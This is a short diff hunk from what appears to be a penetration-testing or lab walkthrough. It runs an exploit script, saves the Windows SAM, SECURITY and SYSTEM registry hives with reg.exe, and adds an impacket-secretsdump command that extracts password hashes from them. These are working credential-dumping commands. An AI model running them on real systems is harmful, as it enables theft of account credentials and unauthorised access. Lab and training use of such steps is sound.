@@ -206,4 +206,7 @@ python2 48389_new-payload.py
 reg.exe save hklm\sam sam.reg
 reg.exe save hklm\security security.reg
 reg.exe save hklm\system system.reg
+
+# on kali:
+impacket-secretsdump -security security.reg -sam sam.reg -system system.reg LOCAL > hashes.txt
 ```
